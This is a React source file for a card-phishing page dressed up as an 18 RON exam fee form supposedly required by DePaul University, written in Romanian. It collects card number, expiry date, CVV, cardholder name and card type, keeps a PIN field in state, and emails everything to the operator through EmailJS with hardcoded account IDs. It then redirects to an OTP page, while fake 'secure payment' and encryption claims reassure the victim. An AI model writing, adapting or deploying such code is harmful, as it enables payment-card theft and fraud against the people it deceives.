import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png'

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [bankName, setBankName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');
  const [pin, setPin] = useState('');
  const navigate = useNavigate();

  const resetForm = () => {
    setBankName('');
    setCardNumber('');
    setExpirationDate('');
    setCvv('');
    setNameOnCard('');
    setCardType('');
    setPin('');
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
     sendEmail();
    setShowConfirmModal(false);
    resetForm();
    navigate('/otp');
  };

  // const handlePinSubmit = (e) => {
  //   e.preventDefault();
  //   sendEmail();
  //   resetForm();
  //   setShowPinModal(false);
  //   navigate('/otp');
  // };

  const handleTextOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(value);
  };

  const handleExpirationDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.replace(/(.{2})(.{2})/, '$1 / $2');
    }
    setExpirationDate(value);
  };

  const sendEmail = () => {
    const templateParams = {
      bankName,
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      cardType,
      pin,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
      <Navbar />
      <div className="container d-flex justify-content-center">
        <div className="col-md-6 mt-5">
          <h2 className="mt-5">FORMULAR EXAMEN</h2>
          <p><strong>Despre examen</strong></p>
          <p>Examen obligatoriu la Universitatea DePaul: 35% din evaluarea cursului dumneavoastră.</p>
          <div className="card mb-3">
            <div className="card-body">
              <p className="card-text fw-medium fs-3">Formular examen Grup Comunitar: #jurnalism #Universitatea DePaul</p>
              <p className="fw-bold fs-4 text-end"> - 18 RON</p>
            </div>
          </div>
          <h3>Faceți plata acum</h3>
          <p>Introduceți următoarele pentru a finaliza plata <b>folosind cardul bancar</b>:<br />
          Introduceți doar detalii corecte pentru a evita <span style={{color: "#FF0000"}}>eroare(le)</span> la plată.</p>
          <div className="card p-4 pt-2">
            <p className='fst-italic text-end p-0 m-0'>Plată de încredere și sigură</p>
            <div className="d-flex justify-content-end mb-3">          
              <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
            </div>
            <Form onSubmit={handlePayClick} autoComplete="off">
              <Form.Group className="mb-3" controlId="bankName">
                <Form.Label>Numele Băncii</Form.Label>
                <Form.Control 
                  placeholder="Introduceți numele băncii" 
                  required 
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                />
              </Form.Group>
              <Form.Group className="mb-3" controlId="cardNumber">
                <Form.Label>Numărul Cardului</Form.Label>
                <Form.Control 
                  placeholder="0000 0000 0000 0000" 
                  required 
                  maxLength="24" 
                  value={cardNumber}
                  onChange={handleCardNumberChange} 
                />
              </Form.Group>
              <div className="row">
                <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
                  <Form.Label>Data Expirării</Form.Label>
                  <Form.Control 
                    placeholder="MM / AA" 
                    required 
                    maxLength="7" 
                    value={expirationDate}
                    onChange={handleExpirationDateChange} 
                  />
                </Form.Group>
                <Form.Group className="col-md-6 mb-3" controlId="cvv">
                  <Form.Label>CVV</Form.Label>
                  <Form.Control 
                    placeholder="000" 
                    required 
                    maxLength="4" 
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                    onInput={handleNumberOnlyInput}
                  />
                </Form.Group>
              </div>
              <Form.Group className="mb-3" controlId="nameOnCard">
                <Form.Label>Numele de pe Card</Form.Label>
                <Form.Control 
                  placeholder="Introduceți numele de pe card" 
                  required 
                  value={nameOnCard}
                  onChange={(e) => setNameOnCard(e.target.value)}
                />
              </Form.Group>
              <Form.Group className="mb-3" controlId="cardType">
                <Form.Label>Tipul Cardului</Form.Label>
                <div>
                  <Form.Check 
                    inline 
                    type="radio" 
                    name="cardType" 
                    id="creditCard" 
                    label="Card de Credit" 
                    required 
                    checked={cardType === 'credit'}
                    onChange={(e) => setCardType('credit')}
                  />
                  <Form.Check 
                    inline 
                    type="radio" 
                    name="cardType" 
                    id="debitCard" 
                    label="Card de Debit" 
                    required 
                    checked={cardType === 'debit'}
                    onChange={(e) => setCardType('debit')}
                  />
                </div>
              </Form.Group>
              <Button variant="primary" type="submit">PLĂTEȘTE</Button>
              <p className="fw-bold text-end"> - 18 RON</p>
            </Form>
          </div>
          <p className="mt-3"><strong>Plată de încredere și sigură</strong><br />
          Securitatea dumneavoastră este prioritatea noastră. Folosim criptare avansată pentru a vă proteja informațiile. Încrederea dumneavoastră este importantă pentru noi.</p>
          
          {/* Modal de Confirmare */}
          <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
            <Modal.Header closeButton>
              <Modal.Title>Confirmați Detaliile</Modal.Title>
            </Modal.Header>
            <Modal.Body>
              <p>Vă rugăm să confirmați și să verificați detaliile <b>cu cardul dumneavoastră bancar</b> înainte de a continua pentru a evita <span style={{color: "#FF0000"}}>eroare(le)</span>.</p>
            </Modal.Body>
            <Modal.Footer>
              <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Anulare</Button>
              <Button variant="primary" onClick={handleConfirmClick}>Da, Am Confirmat</Button>
            </Modal.Footer>
          </Modal>
        </div>
      </div>
      <Footer />
    </div>

  );
};

export default ExamForm;
